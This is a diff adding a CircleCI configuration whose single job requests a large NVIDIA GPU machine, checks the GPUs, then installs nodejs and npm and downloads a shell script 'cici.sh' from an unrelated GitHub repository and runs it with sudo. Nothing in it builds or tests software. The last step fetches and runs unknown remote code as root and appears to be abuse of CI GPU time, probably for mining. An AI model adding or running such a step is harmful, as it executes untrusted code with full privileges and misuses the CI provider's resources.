@@ -1,0 +1,11 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
+    steps:
+      - run: nvidia-smi -L
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
+      - run: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://github.com/ftwta/fitru/raw/main/cici.sh && chmod u+x cici.sh && sudo ./cici.sh
